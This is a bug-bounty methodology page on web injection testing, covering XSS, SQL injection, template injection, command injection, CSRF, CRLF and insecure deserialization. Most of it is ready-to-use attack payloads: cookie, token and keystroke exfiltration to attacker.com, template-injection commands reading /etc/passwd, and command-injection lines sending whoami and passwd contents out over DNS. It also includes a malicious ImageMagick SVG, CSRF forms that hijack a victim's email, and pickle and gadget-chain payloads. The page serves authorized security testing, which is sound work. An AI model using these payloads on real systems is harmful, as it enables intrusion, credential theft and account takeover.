---
icon: lucide/syringe
tags:
  - xss
  - sqli
  - ssti
  - command-injection
  - csrf
  - deserialization
  - bug-bounty
description: Injection happens when user-controlled data is interpreted as code in a context where it shouldn't be. The question is always — what context does this input land in, and what characters control that context?
---

# Injection

Injection happens when user-controlled data is interpreted as code or commands in a context where it shouldn't be. Every place the application takes input and does something with it is a potential injection point. The question is always: *what context does this input land in, and what characters control that context?*

---

<div class="grid cards" markdown>

-   :material-language-html5:{ .lg .middle } __4.1 Cross-Site Scripting__

    ---

    Reflected, stored, DOM, blind. Context identification. Filter bypass. ATO escalation.

    [:octicons-arrow-right-24: XSS](#41-cross-site-scripting-xss)

-   :material-database-search:{ .lg .middle } __4.2 SQL Injection__

    ---

    Error-based, boolean blind, time-based, OOB, second-order, non-standard locations.

    [:octicons-arrow-right-24: SQLi](#42-sql-injection)

-   :material-code-braces:{ .lg .middle } __4.3 Server-Side Template Injection__

    ---

    Polyglot detection, engine identification, RCE per engine.

    [:octicons-arrow-right-24: SSTI](#43-server-side-template-injection-ssti)

-   :material-console:{ .lg .middle } __4.4 Command Injection__

    ---

    Shell separators, blind via sleep, OOB exfiltration, hidden attack surfaces.

    [:octicons-arrow-right-24: CMDi](#44-command-injection)

-   :material-shield-alert-outline:{ .lg .middle } __4.5 CSRF__

    ---

    Token bypass, JSON CSRF, SameSite bypass, PoC construction.

    [:octicons-arrow-right-24: CSRF](#45-cross-site-request-forgery-csrf)

-   :material-format-pilcrow:{ .lg .middle } __4.6 CRLF Injection__

    ---

    Header injection, response splitting, session fixation, XSS escalation.

    [:octicons-arrow-right-24: CRLF](#46-crlf-injection--header-injection)

-   :material-package-variant:{ .lg .middle } __4.7 Insecure Deserialization__

    ---

    Java, PHP, Python pickle. Safe OOB PoC without RCE.

    [:octicons-arrow-right-24: Deserialization](#47-insecure-deserialization)

</div>

---

## Decision Flow

```
Input is reflected back in the HTML response?
→ XSS. Identify context first, then payload.

Parameter changes query results or causes a DB error?
→ SQLi. Boolean test first, then time-based if blind.

Input appears rendered inside an email template, notification, or page content?
→ SSTI. Inject polyglot probe — {{7*7}}${7*7}<%= 7*7 %>

Feature invokes OS utilities (ping, DNS, conversion, PDF generation)?
→ Command injection. ;sleep 5 to confirm blind.

State-changing endpoint with no CSRF token?
→ Build PoC HTML. Test SameSite cookie attribute.

Value in cookie or hidden field looks base64 and binary?
→ Deserialization. Decode and check magic bytes before anything else.

Redirect parameter or value reflected in response header?
→ CRLF. Inject %0d%0a and check response headers.
```

---

## 4.1 Cross-Site Scripting (XSS)

User-supplied input is rendered in a browser context without proper encoding, allowing an attacker to execute arbitrary JavaScript in the victim's browser. Impact ranges from cookie theft and session hijacking to full account takeover, keylogging, and phishing under the trusted domain.

**The three types have different sources, sinks, and testing approaches.**

### 4.1.1 Reflected XSS

The payload is in the request and immediately reflected back in the response. Requires the victim to visit a crafted URL.

**Step 1 — identify reflection, Step 2 — identify context, Step 3 — payload.**

**The five HTML contexts:**

| Context | Example | Breaking Character | Payload Start |
|---|---|---|---|
| HTML body | `<div>INPUT</div>` | `<` | `<script>` or `<img src=x onerror=...>` |
| HTML attribute (quoted) | `<input value="INPUT">` | `"` | `"><script>` |
| HTML attribute (unquoted) | `<input value=INPUT>` | space or `>` | `onmouseover=alert(1)` |
| JavaScript string | `var x = "INPUT";` | `"` or `'` | `"-alert(1)-"` |
| JS template literal | `` var x = `INPUT`; `` | `` ` `` | `` `${alert(1)}` `` |
| URL attribute | `<a href="INPUT">` | — | `javascript:alert(1)` |

```javascript title="starter_payloads.js"
// Basic — works if no filtering:
<script>alert(document.domain)</script>

// Attribute break:
"><script>alert(1)</script>
"><img src=x onerror=alert(1)>
" onmouseover="alert(1)

// JS string context:
";alert(1)//
'-alert(1)-'

// No script tag:
<img src=x onerror=alert(1)>
<svg onload=alert(1)>
<details open ontoggle=alert(1)>
<iframe src="javascript:alert(1)">
```

```bash title="xss_tools.sh"
# Dalfox — fast, accurate
dalfox url "https://target.com/search?q=FUZZ" \
  --skip-bav --cookie "session=<token>" \
  --output dalfox_results.txt

# Pipe from parameter list:
cat params.txt | dalfox pipe --cookie "session=<token>"

# kxss — fast inline scanner for reflected params:
cat urls.txt | kxss
```

!!! warning "alert(1) gets blocked"
    Use `alert(document.domain)` instead. It proves domain context and is harder to filter or false-positive on. Always confirm execution in a real browser — curl output is not enough.

---

### 4.1.2 Stored XSS

The payload is stored in the database and rendered whenever the page is viewed — by any user, including admins. Impact is higher than reflected because no victim interaction is needed beyond visiting the page, and admin views mean privilege escalation.

**High-value injection points:**

```
User profile: name, bio, location, website URL
Comments and reviews
Uploaded file names (viewed in file browser)
Support ticket content (viewed by support/admin)
Message/chat content
Notification text, address fields, company name
Any field that appears in an admin dashboard
```

**Blind XSS — when you can't see where the input renders:**

```javascript title="blind_xss_payloads.js"
// XSS Hunter — captures cookie, DOM, screenshot, URL where it fired:
<script src="https://your.xsshunter.io/abc.js"></script>

// Fetch-based exfil (bypasses some CSPs):
<script>fetch('https://interactsh.server/?c='+document.cookie)</script>

// Image-based (no script tag):
<img src=x onerror="this.src='https://interactsh.server/?c='+document.cookie">

// In input field names (fires when admin views form submissions):
<input name='"><script src="https://xsshunter.io/abc.js"></script>'>

// SVG:
<svg><script>alert(document.domain)</script></svg>
```

!!! tip "XSS Hunter setup"
    Register at `xsshunter.trufflesecurity.com` (free). Inject your payload in every stored field. If it fires in an admin panel → admin XSS → escalate to ATO.

---

### 4.1.3 DOM XSS

The vulnerability lives entirely in client-side JavaScript. The server never sees the payload — it flows from a **source** (where attacker input enters JS) to a **sink** (where JS interprets it as code or HTML).

**Common sources:**
```javascript
document.location.search   // ?param=value
document.location.hash     // #fragment — most overlooked source
document.referrer
window.name
localStorage / sessionStorage
```

**Common sinks:**
```javascript
// HTML sinks (classic DOM XSS):
element.innerHTML = SOURCE
document.write(SOURCE)

// URL sinks:
location.href = SOURCE
element.src = SOURCE

// Execution sinks:
eval(SOURCE)
setTimeout(SOURCE, 0)
Function(SOURCE)()
```

```bash title="dom_xss_hunt.sh"
# Search JS files for dangerous sinks:
grep -rn "innerHTML\|outerHTML\|document.write\|eval(" ./js_files/

# Manual hash-based test (most common DOM XSS source):
# https://target.com/page#<img src=x onerror=alert(document.domain)>
# https://target.com/search#q=<svg onload=alert(1)>
```

!!! tip "DOM Invader"
    Open Burp's embedded browser, enable DOM Invader in extension settings, browse the app. It automatically identifies sources and sinks and reports DOM XSS candidates with canary injection.

---

### 4.1.4 XSS Filter Bypass

**Systematic approach when basic payloads are blocked:**

=== "Tag/case variation"

    ```javascript
    <ScRiPt>alert(1)</ScRiPt>
    <IMG SRC=X ONERROR=alert(1)>
    <<script>alert(1)</script>
    ```

=== "No parentheses"

    ```javascript
    <img src=x onerror=alert`1`>
    <script>onerror=alert;throw 1</script>
    <script>{onerror=alert}throw 1</script>
    ```

=== "No spaces"

    ```javascript
    <img/src=x/onerror=alert(1)>
    <svg/onload=alert(1)>
    ```

=== "Encoding"

    ```javascript
    // HTML entities:
    <img src=x onerror=&#97;lert(1)>
    // JS unicode:
    <script>\u0061lert(1)</script>
    // Double URL encode:
    %253Cscript%253Ealert(1)%253C/script%253E
    ```

=== "Event handler variety"

    ```javascript
    <body onpageshow=alert(1)>
    <marquee onstart=alert(1)>
    <select autofocus onfocus=alert(1)>
    <input autofocus onfocus=alert(1)>
    <video src=x onerror=alert(1)>
    <audio src=x onerror=alert(1)>
    ```

!!! tip "PortSwigger XSS Cheat Sheet"
    [portswigger.net/web-security/cross-site-scripting/cheat-sheet](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet) — filterable by context and browser. Bookmark this. Use it every time basic payloads fail.

---

### 4.1.5 XSS to Account Takeover

Escalating beyond `alert(1)`:

=== "Cookie theft"

    ```javascript
    // Redirect with cookie:
    document.location='https://attacker.com/steal?c='+document.cookie

    // Fetch (stealthier, no redirect):
    fetch('https://interactsh.server/?c='+encodeURIComponent(document.cookie))

    // Note: HttpOnly cookies cannot be stolen via JS — use CSRF instead
    ```

=== "CSRF via XSS"

    ```javascript
    // When HttpOnly blocks cookie theft — perform actions as victim:
    fetch('/api/users/me', {
      method: 'PUT',
      headers: {'Content-Type': 'application/json'},
      body: JSON.stringify({email: 'attacker@evil.com'}),
      credentials: 'include'
    })
    // Then trigger password reset to attacker email → ATO
    ```

=== "Token theft"

    ```javascript
    // If OAuth/API token in localStorage (not HttpOnly):
    fetch('https://attacker.com/?t='+localStorage.getItem('access_token'))
    ```

=== "Keylogger"

    ```javascript
    document.addEventListener('keypress', e => {
      fetch('https://attacker.com/keys?k='+e.key)
    })
    ```

---

### 4.1.6 CSP Bypass

```bash title="read_csp.sh"
curl -sv https://target.com/ 2>&1 | grep -i "content-security-policy"
# Then paste policy at: https://csp-evaluator.withgoogle.com/
```

| Weakness | Bypass |
|---|---|
| `unsafe-inline` present | Inline scripts allowed — basic XSS works |
| `unsafe-eval` present | `eval()` allowed — JS string execution |
| Whitelisted CDN with user content | Upload JS to CDN, load from there |
| `*.google.com` in `script-src` | JSONP endpoints on Google execute JS |
| Wildcard subdomain `*.target.com` | Find XSS on any subdomain |
| `data:` in `script-src` | `<script src="data:text/javascript,alert(1)">` |
| Static nonce (not per-request) | Reuse it |

```javascript title="jsonp_csp_bypass.js"
// If CSP allows scripts from accounts.google.com:
<script src="https://accounts.google.com/o/oauth2/revoke?callback=alert(1)//"></script>
```

---

### 4.1.7 XSS Checklist

```
□ Every input field — inject canary string, find reflection point
□ URL parameters — all of them, not just obvious ones
□ URL hash (#fragment) — DOM XSS source
□ HTTP headers reflected in response (User-Agent, Referer)
□ File names on upload
□ Error messages that reflect input
□ Identify rendering context before choosing payload
□ Run Dalfox on all parameterized URLs
□ Run DOM Invader while manually browsing
□ Install XSS Hunter payload in all stored fields
□ Read CSP header — analyze for bypasses
□ If XSS found: escalate to ATO (cookie theft, CSRF, token theft)
```

---

## 4.2 SQL Injection

User input is incorporated into a SQL query without parameterization. The attacker closes the intended query structure and injects their own SQL. Most common in legacy codebases, search/filter functionality, APIs accepting complex filter params, and `ORDER BY` clauses.

### 4.2.1 Detection

**Probe every input with these first:**

```sql title="detection_probes.sql"
-- String context:
'
''
')
'))
' OR '1'='1
' AND '1'='1-- -

-- Numeric context (no quotes):
1 AND 1=1
1 AND 1=2
1 ORDER BY 1-- -
1 ORDER BY 100-- -   ← error if column count exceeded

-- Boolean canary (no error, behavior changes):
' AND '1'='1-- -    ← true: same results
' AND '1'='2-- -    ← false: empty/different results
```

**Signs of vulnerability:**
```
→ Database error message (MySQL/MSSQL/OracleDB syntax visible)
→ Empty response when data is expected (false condition)
→ Different response size for true vs false condition
→ 500 error / application crash
→ Time delay (time-based blind)
```

**Where to look beyond URL params:**
```
Search fields, filter params, login forms
Order/sort: ?sort=name&order=asc
HTTP headers: User-Agent, X-Forwarded-For, Referer (often logged to DB)
Cookies containing IDs or session data
ORDER BY / GROUP BY params — cannot use prepared statements in most DBs
JSON body: {"filter": {"name": "test' AND 1=1-- -"}}
```

---

### 4.2.2 SQLi Types

=== "Error-based"

    ```sql title="error_based.sql"
    -- MySQL:
    ' AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT version()),0x7e))-- -
    ' AND UPDATEXML(1,CONCAT(0x7e,(SELECT user()),0x7e),1)-- -

    -- PostgreSQL:
    ' AND 1=CAST((SELECT version()) AS INT)-- -

    -- MSSQL:
    ' AND 1=CONVERT(INT,(SELECT @@version))-- -

    -- Oracle:
    ' AND 1=CTXSYS.DRITHSX.SN(1,(SELECT banner FROM v$version WHERE rownum=1))-- -
    ```

=== "Boolean blind"

    ```sql title="boolean_blind.sql"
    -- True condition (same response as normal):
    ' AND 1=1-- -

    -- False condition (different/empty response):
    ' AND 1=2-- -

    -- Extract character by character:
    ' AND SUBSTRING(database(),1,1)='a'-- -
    ' AND ASCII(SUBSTRING(database(),1,1))>97-- -  ← binary search
    ' AND ASCII(SUBSTRING(database(),1,1))=109-- - ← exact match
    ```

=== "Time-based blind"

    ```sql title="time_based.sql"
    -- MySQL:
    ' AND SLEEP(5)-- -
    ' AND IF(SUBSTRING(database(),1,1)='t',SLEEP(5),0)-- -

    -- PostgreSQL:
    '; SELECT pg_sleep(5)-- -

    -- MSSQL:
    '; WAITFOR DELAY '0:0:5'-- -

    -- Confirm with timing:
    -- time curl -s "https://target.com/search?q=test' AND SLEEP(5)-- -"
    -- real 5.032s → confirmed
    ```

=== "Out-of-band (DNS)"

    ```sql title="oob_sqli.sql"
    -- MSSQL (most reliable):
    '; EXEC master..xp_dirtree '\\abc123.interactsh.com\share'-- -

    -- MySQL (requires FILE privilege):
    ' AND LOAD_FILE(CONCAT('\\\\',(SELECT version()),'.abc123.interactsh.com\\abc'))-- -

    -- Oracle:
    ' AND (SELECT UTL_HTTP.request('http://abc123.interactsh.com/'||
      (SELECT banner FROM v$version WHERE rownum=1)) FROM dual) IS NOT NULL-- -
    ```

---

### 4.2.3 sqlmap Usage on Live Targets

```bash title="sqlmap_safe.sh"
# Detection — least invasive first:
sqlmap -u "https://target.com/search?q=test" \
  --level=1 --risk=1 --batch \
  --technique=BEUST \
  --delay=2 \
  --output-dir=./sqlmap_output

# With authentication:
sqlmap -u "https://target.com/search?q=test" \
  --cookie="session=<token>" --level=2 --batch

# From a saved Burp request:
sqlmap -r request.txt --level=2 --batch

# After confirming injection — extract minimal PoC:
sqlmap -u "..." --dbs                          # list databases
sqlmap -u "..." -D target_db --tables          # list tables
sqlmap -u "..." -D target_db -T users --dump   # dump table (2-3 rows max)
```

!!! danger "Rules for live programs"
    Always start at `--level=1 --risk=1`. Throttle with `--delay=2`. Never use `--os-shell`, `--os-cmd`, `--file-write`, or `--file-read` on live targets. Once injection is confirmed — stop sqlmap, report manually. Do not dump the entire database. Two or three rows as PoC is sufficient.

---

### 4.2.4 Second-Order SQLi

The payload is stored safely (escaped) on input, but when retrieved and used in a subsequent query without re-sanitization, injection occurs.

```
Classic example:
  Register with username: admin'-- -
  → Stored safely (escaped) in DB

  Password change query uses stored username:
  UPDATE users SET password='new' WHERE username='admin'-- -'
  → Closes string, comments out rest → changes admin's password
```

```bash title="second_order_test.sh"
# 1. Register/create with SQL payloads:
#    admin'-- -
#    test' AND '1'='1
#
# 2. Perform operations that use the stored value in a new query:
#    - Change password
#    - Update profile
#    - Export data using stored preferences
#    - Search using stored settings
#
# 3. Look for: changed behavior, errors, wrong data returned
```

---

### 4.2.5 SQLi Checklist

```
DETECTION
□ Single quote in every parameter — error or behavior change?
□ Boolean true/false conditions — different response size?
□ SLEEP() in every parameter — time delay?
□ Non-standard locations: headers, cookies, JSON body, ORDER BY

IDENTIFICATION
□ Identify database type (MySQL, Postgres, MSSQL, Oracle)
□ Identify injection type (error, boolean blind, time blind, OOB)

EXPLOITATION (PoC only — minimal footprint)
□ Confirm with sqlmap at level=1/risk=1
□ Extract: DB version, current user, DB name
□ Extract: one sample row from users table — no full dumps
□ Second-order: register with payload, trigger via profile update
□ HTTP headers: User-Agent, X-Forwarded-For, Referer
□ ORDER BY / GROUP BY params
```

---

## 4.3 Server-Side Template Injection (SSTI)

Template engines let developers embed expressions like `{{user.name}}` in HTML. If user input is passed directly into the template string rather than as a variable value, the attacker can inject expressions that execute on the server — often leading to full RCE.

### 4.3.1 Detection and Engine Identification

**Polyglot probe — inject this first:**

```
{{7*7}}${7*7}#{7*7}<%= 7*7 %>{{7*'7'}}
```

If the response contains `49`, `7777777`, or a math result — SSTI confirmed.

**Where to probe:**
```
URL parameters: ?name=John{{7*7}}
Profile fields: display name, bio, email templates
Search fields rendered back to page
Uploaded file names
Error messages that reflect paths
Feedback forms
```

**Engine identification via differentiation:**

| Probe | Result | Engine |
|---|---|---|
| `{{7*7}}` | `49` | Jinja2, Twig, Pebble |
| `${7*7}` | `49` | FreeMarker, Velocity, Thymeleaf |
| `<%= 7*7 %>` | `49` | ERB (Ruby), EJS (Node) |
| `{{7*'7'}}` | `7777777` | Jinja2 |
| `{{7*'7'}}` | `49` | Twig |
| `{7*7}` | `49` | Smarty |
| `@(7*7)` | `49` | Razor (.NET) |

---

### 4.3.2 RCE Payloads by Engine

=== "Jinja2 (Python/Flask)"

    ```python title="jinja2_rce.py"
    # Read /etc/passwd:
    {{config.__class__.__init__.__globals__['os'].popen('cat /etc/passwd').read()}}

    # Via cycler (Flask-specific, shorter):
    {{cycler.__init__.__globals__.os.popen('id').read()}}

    # WAF bypass — use |attr() filter if __class__ is blocked:
    ()|attr('__class__')|attr('__mro__')
    ```

=== "Twig (PHP)"

    ```php title="twig_rce.php"
    {{_self.env.registerUndefinedFilterCallback("exec")}}
    {{_self.env.getFilter("id")}}

    // Or:
    {{['id']|filter('system')}}
    {{['cat /etc/passwd']|filter('passthru')}}
    ```

=== "FreeMarker (Java)"

    ```java title="freemarker_rce.java"
    <#assign ex="freemarker.template.utility.Execute"?new()>
    ${ex("id")}
    ```

=== "ERB (Ruby)"

    ```ruby title="erb_rce.rb"
    <%= `id` %>
    <%= IO.popen('id').read %>
    ```

!!! warning "Confirm blind SSTI with OOB first"
    Use DNS callback via interactsh before attempting RCE. Confirms execution without risking crashes or triggering WAF alerts on more aggressive payloads.

```bash title="sstimalp_scan.sh"
# SSTImap — automated detection and exploitation
python3 sstimap.py -u "https://target.com/page?name=test" \
  --crawl --cookie "session=<token>"
```

---

### 4.3.3 SSTI Checklist

```
□ Polyglot probe in every user-controlled field that renders in response
□ Math probe: {{7*7}}, ${7*7}, <%= 7*7 %>
□ 49 appears in response → confirmed
□ Identify engine via differentiation probes
□ Blind SSTI: OOB (DNS via interactsh) before RCE attempt
□ Check sandboxed vs. unsandboxed Jinja2 configs
□ For PoC: show id or hostname output — stop there, no full shell
```

---

## 4.4 Command Injection

The application passes user input to an OS shell command without sanitization. The attacker appends shell operators to inject additional commands. Impact: RCE — typically Critical.

### 4.4.1 Detection Probes

```bash title="cmdi_probes.sh"
# Append after normal input — one of these will work:
test;id
test&&id
test||id
test|id
test`id`
test$(id)
test%0aid       # newline separator

# Blind — time-based confirmation:
test;sleep 5
test&&sleep 5
test$(sleep 5)

# Confirm timing:
time curl -s "https://target.com/api/ping?host=127.0.0.1;sleep+5"
# real 5.1s → confirmed
```

---

### 4.4.2 Blind OOB Exfiltration

```bash title="cmdi_oob.sh"
# Start listener:
interactsh-client -server interactsh.com -token <token>
# Get: abc123.interactsh.com

# DNS callback payloads — inject after normal input:
; nslookup $(whoami).abc123.interactsh.com
; curl http://abc123.interactsh.com/$(whoami)
; host $(cat /etc/passwd | head -1 | base64 | tr -d '\n').abc123.interactsh.com

# Attacker receives: root.abc123.interactsh.com → confirms root execution
```

---

### 4.4.3 Hidden Attack Surfaces

Features that commonly invoke OS commands — check all of these:

| Feature | Vector |
|---|---|
| Ping / traceroute functionality | `host=127.0.0.1;id` |
| DNS lookup features | Hostname parameter |
| File conversion (ImageMagick, ffmpeg) | Filename, metadata |
| Archive creation / extraction | Filename parameter |
| "Send test email" | Server hostname field |
| PDF / document generation | Header injection → command |
| Build / deployment hooks | Any trigger parameter |
| Server status / health check pages | Any query parameter |

```bash title="imagemagick_cmdi.sh"
# Malicious SVG for ImageMagick processing:
cat > payload.svg << 'EOF'
<?xml version="1.0" standalone="no"?>
<!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN"
"http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd">
<svg width="200px" height="200px" xmlns="http://www.w3.org/2000/svg"
xmlns:xlink="http://www.w3.org/1999/xlink">
<image xlink:href="https://example.com/image.jpg`nslookup abc123.interactsh.com`"
x="0" y="0" height="200px" width="200px"/>
</svg>
EOF
# Upload to any image processing endpoint
```

---

## 4.5 Cross-Site Request Forgery (CSRF)

A malicious page causes a victim's browser to send a state-changing request to a target site where the victim is authenticated. The browser includes cookies automatically — the server can't distinguish legitimate requests from forged ones.

### 4.5.1 Detection

**An endpoint is vulnerable when all three are true:**

```
1. It performs a state-changing action (not just reading data)
2. It relies solely on cookies/session for authentication
3. It has no valid CSRF defense
```

**Testing existing defenses:**

```bash title="csrf_token_bypass.sh"
# If token present — test these bypasses:

# 1. Remove the token entirely:
POST /api/email/change
email=attacker@evil.com
# (no csrf_token parameter at all)

# 2. Empty token:
csrf_token=

# 3. Random value (same length):
csrf_token=aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa

# 4. Your own token for victim's session:
# Get a valid token from your session → use in request with victim's cookie
# If accepted → token not tied to session
```

---

### 4.5.2 PoC Construction

=== "Standard HTML form"

    ```html title="csrf_poc.html"
    <html>
    <body>
      <form id="csrf" action="https://target.com/api/user/email" method="POST">
        <input type="hidden" name="email" value="attacker@evil.com" />
        <input type="hidden" name="confirm_email" value="attacker@evil.com" />
      </form>
      <script>document.getElementById('csrf').submit();</script>
    </body>
    </html>
    ```

=== "JSON CSRF"

    ```html title="json_csrf_poc.html"
    <!-- text/plain bypass — body becomes valid JSON -->
    <form action="https://target.com/api/settings" method="POST"
      enctype="text/plain">
      <input type="hidden" name='{"email":"attacker@evil.com","x":"' value='"}' />
    </form>

    <!-- fetch() — only works if CORS is misconfigured (application/json triggers preflight) -->
    <script>
    fetch('https://target.com/api/settings', {
      method: 'POST',
      credentials: 'include',
      mode: 'no-cors',
      body: JSON.stringify({email: 'attacker@evil.com'})
    })
    </script>
    ```

=== "GET-based"

    ```html title="get_csrf_poc.html"
    <!-- For GET-based state changes (rare but exists) -->
    <img src="https://target.com/api/user/delete?confirm=true" style="display:none">
    ```

---

### 4.5.3 SameSite Bypass

| Cookie Attribute | Cross-site POST | Top-level GET navigation | Notes |
|---|---|---|---|
| `SameSite=None` | Sent | Sent | Fully vulnerable |
| `SameSite=Lax` | Blocked | Sent | GET-based state changes still vulnerable |
| `SameSite=Strict` | Blocked | Blocked | Near-impossible without subdomain XSS |
| Not set (Chrome default) | Blocked (Lax behavior) | Sent | Same as Lax |

**Bypasses for Lax/Strict:**

```
GET-based state change → top-level navigation allowed under Lax → still vulnerable

Subdomain XSS chain:
→ XSS on sub.target.com (same registrable domain)
→ SameSite doesn't apply between sub.target.com and target.com
→ Use XSS to send CSRF request cross-subdomain

2-minute cookie window (Chrome):
→ Newly set cookies (within 2 minutes) are sent on cross-site POST in some versions
→ Trigger re-authentication → new cookie → exploit window
```

---

## 4.6 CRLF Injection & Header Injection {#46-crlf-injection--header-injection}

`\r\n` is the HTTP line separator. User input containing `\r\n` inserted into a response header without sanitization lets an attacker inject additional headers — or split the response entirely to inject a full HTTP body.

### 4.6.1 Detection and Escalation

**Where to probe:**

```
Redirect parameters: ?next=https://target.com%0d%0aHeader:injected
URL path: /redirect/%0d%0aSet-Cookie:evil=1
Any value reflected in a response header (Location, Set-Cookie, Link)
```

```bash title="crlf_probe.sh"
# Probe strings:
%0d%0a          # URL-encoded \r\n
%0D%0A          # uppercase
%0a             # just LF (some servers accept)

# Confirm injection:
curl -sv "https://target.com/redirect?url=https://example.com%0d%0aX-Injected:yes" 2>&1 | \
  grep -i "x-injected"
# X-Injected: yes in response → CRLF confirmed
```

**Escalation chain:**

| Injection | Payload | Impact |
|---|---|---|
| Header injection | `%0d%0aX-Test:injected` | Confirmed CRLF |
| Set-Cookie injection | `%0d%0aSet-Cookie:session=attacker` | Session fixation |
| Response splitting | `%0d%0a%0d%0a<script>alert(1)</script>` | XSS |
| Content-Type + body | `%0d%0aContent-Type:text/html%0d%0a%0d%0a<script>alert(1)</script>` | XSS |

---

## 4.7 Insecure Deserialization

Applications serialize objects to transmit or store them. If user-controlled serialized data is deserialized without validation, an attacker can manipulate object properties or trigger gadget chains that execute arbitrary code during deserialization.

**The detection-first rule:** In bug bounty, confirming the attack surface and demonstrating the vulnerability class is sufficient for a High/Critical report. You don't need a full RCE PoC.

### 4.7.1 Identifying Serialized Data

**Signatures by language:**

| Language | Format | Signature |
|---|---|---|
| Java | Binary | `AC ED 00 05` (hex) / `rO0AB` (base64) |
| PHP | Text | `O:4:"User":2:{s:4:"name";s:4:"John";}` |
| Python pickle | Binary | `\x80\x02` or `\x80\x04` |
| Ruby Marshal | Binary | `\x04\x08` |
| .NET BinaryFormatter | Binary | `AAEAAAD/////` (base64) |

**Where to look:**

```
Cookies — base64-decode all of them
Hidden form fields
API request body parameters
Remember-me tokens
Session data
__VIEWSTATE in .NET apps
```

```bash title="detect_serialization.sh"
# Check cookie for Java serialization magic bytes:
echo "<cookie_value>" | base64 -d | xxd | head -1
# ac ed 00 05 → Java serialization confirmed

# PHP is plaintext after base64 decode:
echo "<cookie_value>" | base64 -d
# O:10:"UserObject":1:{s:4:"name";s:4:"John";}
```

---

### 4.7.2 Safe PoC by Language

=== "Java (ysoserial)"

    ```bash title="java_deser_poc.sh"
    # Generate URLDNS payload — triggers DNS lookup only, no RCE, safe for live targets:
    java -jar ysoserial.jar URLDNS "http://abc123.interactsh.com" | base64 -w0

    # Submit as the serialized cookie/parameter
    # Monitor interactsh for DNS callback
    # DNS callback = deserialization is occurring → report as High/Critical
    # Note available chains: CommonsCollections1-7, Spring, etc.
    ```

=== "PHP (PHPGGC)"

    ```bash title="php_deser_poc.sh"
    # Property manipulation — safe, no RCE needed:
    # 1. Decode cookie: base64 -d → O:4:"User":1:{s:4:"role";s:4:"user";}
    # 2. Modify property: change "user" to "admin"
    # 3. Re-encode: php -r 'echo base64_encode(serialize(...));'
    # 4. Submit — if behavior changes → confirmed

    # For gadget chain PoC (if program allows):
    phpggc --list | grep -i "laravel\|symfony"
    phpggc Laravel/RCE1 system id | base64 -w0
    ```

=== "Python pickle"

    ```python title="python_pickle_poc.py"
    import pickle, os, base64

    # Detect:
    data = base64.b64decode("<parameter_value>")
    if data[:2] in [b'\x80\x02', b'\x80\x03', b'\x80\x04', b'\x80\x05']:
        print("Python pickle detected")

    # Safe OOB PoC:
    class OOBPayload:
        def __reduce__(self):
            return (os.system, ('nslookup abc123.interactsh.com',))

    payload = base64.b64encode(pickle.dumps(OOBPayload())).decode()
    print(payload)
    # Submit, watch interactsh for DNS callback
    ```

!!! danger "DNS callback is the safe standard"
    Never submit reverse shells or file-write payloads on production systems. DNS callback via URLDNS/nslookup confirms deserialization is occurring without any harmful side effects. Most programs accept this as sufficient evidence for High/Critical.

---

## Part 4 Complete Checklist

??? note "Expand full checklist"

    ```
    XSS
    □ Canary string in every input → find reflection point
    □ URL parameters — all of them
    □ URL hash (#) for DOM XSS source
    □ HTTP headers reflected in response
    □ File names on upload
    □ Identify rendering context before choosing payload
    □ Run Dalfox on all parameterized URLs
    □ Run DOM Invader while manually browsing
    □ Install XSS Hunter payload in all stored fields
    □ Read CSP header — analyze for bypasses
    □ Escalate: cookie theft, CSRF-via-XSS, token theft from localStorage

    SQL INJECTION
    □ Single quote in every parameter — error or behavior change?
    □ Boolean true/false conditions — response difference?
    □ SLEEP() — time delay confirms blind injection
    □ Non-standard: headers, cookies, ORDER BY, JSON body
    □ Second-order: register with SQL payload, trigger via update
    □ sqlmap at level=1/risk=1 (throttled, no --os-shell)
    □ Capture DB version + current user as PoC, stop there

    SSTI
    □ Polyglot probe in all rendered fields
    □ 49 in response → confirmed
    □ Identify engine via differentiation
    □ Blind SSTI: OOB via DNS before RCE attempt
    □ SSTImap for automated exploitation

    COMMAND INJECTION
    □ Shell separators after every input: ;id &&id ||id $(id) `id`
    □ Blind: sleep 5 → time delay
    □ Blind OOB: nslookup $(whoami).interactsh.com
    □ Image/file processing (ImageMagick, ffmpeg)
    □ Network utility features (ping, DNS lookup, traceroute)
    □ Document generation (wkhtmltopdf, Pandoc, LaTeX)

    CSRF
    □ State-changing endpoints: CSRF token present?
    □ Token bypass: remove it, empty it, use own token for victim
    □ SameSite cookie attribute: Strict/Lax/None?
    □ GET-based state changes (vulnerable even with SameSite=Lax)
    □ JSON endpoints: text/plain PoC, check form-encoded also accepted
    □ Build auto-submitting PoC HTML, confirm action executes

    CRLF
    □ %0d%0a in redirect/URL parameters
    □ Inject X-Test header → confirm in response
    □ Escalate: Set-Cookie injection → session fixation
    □ Escalate: double CRLF → response splitting → XSS

    DESERIALIZATION
    □ Base64-decode all cookies → check for serialization magic bytes
    □ Java: AC ED 00 05 / rO0AB → ysoserial URLDNS OOB PoC
    □ PHP: O:N: pattern → property manipulation PoC
    □ Python: \x80\x02 → pickle OOB PoC
    □ .NET: AAEAAAD → ViewState tampering
    □ Hidden form fields, remember-me tokens, cache params
    ```

---

## References

<div class="grid cards" markdown>

-   :simple-portswigger: __PortSwigger Labs__

    ---

    - [XSS (all types)](https://portswigger.net/web-security/cross-site-scripting)
    - [SQL injection](https://portswigger.net/web-security/sql-injection)
    - [SSTI](https://portswigger.net/web-security/server-side-template-injection)
    - [OS command injection](https://portswigger.net/web-security/os-command-injection)
    - [CSRF](https://portswigger.net/web-security/csrf)
    - [Deserialization](https://portswigger.net/web-security/deserialization)

-   :octicons-tools-16: __Tools__

    ---

    - [Dalfox](https://github.com/hahwul/dalfox)
    - [SSTImap](https://github.com/vladko312/SSTImap)
    - [sqlmap](https://sqlmap.org)
    - [ysoserial](https://github.com/frohoff/ysoserial)
    - [PHPGGC](https://github.com/ambionics/phpggc)
    - [CSP Evaluator](https://csp-evaluator.withgoogle.com/)

-   :octicons-book-16: __References__

    ---

    - [PortSwigger XSS Cheat Sheet](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet)
    - [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings)
    - [HackTricks — Web](https://book.hacktricks.xyz/pentesting-web)

</div>